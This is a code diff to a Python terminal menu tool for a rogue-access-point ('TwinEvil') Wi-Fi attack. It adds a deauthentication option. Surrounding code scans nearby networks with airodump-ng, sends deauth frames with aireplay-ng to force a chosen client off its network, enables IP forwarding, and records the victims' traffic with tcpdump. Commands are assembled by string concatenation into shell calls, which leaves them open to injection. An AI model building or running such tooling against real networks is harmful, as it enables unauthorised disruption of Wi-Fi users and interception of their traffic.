@@ -12,6 +12,7 @@ with open("conf/local.json") as json_data_file:
 
 sys.path.append(data["pathSRC"])
 import settings
+from deauth import *
 
 def shell(command):
 	stream = os.popen(command)
@@ -34,7 +35,7 @@ def displayMenu():
 		print("Capture Packets : ", '\x1b[0;37;41m' + settings.globals["capture"] + '\x1b[0m', "\n")
 	else:
 		print("Capture Packets : ", '\x1b[6;30;42m' + settings.globals["capture"] + '\x1b[0m', "\n")	
-	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Start/Stop Packets capture", "Exit"]
+	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Deauthentification", "Start/Stop Packets capture", "Exit"]
 	terminal_menu = TerminalMenu(options)
 	menu_entry_index = terminal_menu.show()
 	match menu_entry_index:
@@ -45,8 +46,10 @@ def displayMenu():
 		case 2:
 			startTwin()
 		case 3:
-			capturePackets(settings.globals["interfaceAP"])
+			displaySelectDevice()
 		case 4:
+			capturePackets(settings.globals["interfaceAP"])
+		case 5:
 			return False
 	return True
 
@@ -79,8 +82,8 @@ def print_array(array):
 		print(row)
 
 def airoScan(wlan):
-	#shell("rm res/*")
-	shell("airodump-ng " + wlan + " -w res/captures & sleep 10; pkill airodump")
+	shell("rm res/targetAP/*")
+	shell("airodump-ng " + wlan + " -w res/targetAP/captures & sleep 10; pkill airodump")
 
 def firewallRouting(wlan):
 	shell("echo 1 > /proc/sys/net/ipv4/ip_forward") #MODE FORWARD
@@ -117,13 +120,9 @@ def hostapdEnable():
 def deAuth(wlan, bssid, MacDevice):
 	shell('aireplay-ng -0 1 -a '+ bssid + ' -c ' + MacDevice + ' ' + wlan)
 
-def airoScanTarget(wlan, bssid, channel):
-	#shell('airodump-ng -d ' + bssid + ' -c' + channel + ' ' + wlan)
-	call(["gnome-terminal", "-x", "sh", "-c", "airodump-ng -d " + bssid + " -c " + channel + " " + wlan + " ; bash"])
-
-def get_aps():
+def getAps():
     accessPoints = {"header" : [], "aps" : []}
-    with open("res/captures-01.csv", "r") as file:
+    with open("res/targetAP/captures-01.csv", "r") as file:
         reader = csv.reader(file)
         for row in reader:
             accessPoints["aps"].append(row)
@@ -145,8 +144,8 @@ def get_aps():
     return accessPoints
 
 def displaySelectTarget():
-	#airoScan(settings.global["interfaceAP"])
-	aps = get_aps()
+	#airoScan(settings.globals["interfaceAP"])
+	aps = getAps()
 	options = tabulate(aps["aps"], headers=aps["header"])
 	headers = options.split("\n")[0:2]
 	headers = "\n".join(headers)
@@ -168,10 +167,7 @@ def capturePackets(wlan):
 	if settings.globals["capture"] == 'OFF':
 		settings.globals["capture"] = 'ON'
 		call(["gnome-terminal", "-x", "sh", "-c", "tcpdump -i " + wlan + " -s 65535 -w dataCaptured.pcap; bash"])
-
 	else:
 		settings.globals["capture"] = 'OFF'
 		shell("pkill tcpdump")
-		
-		
 
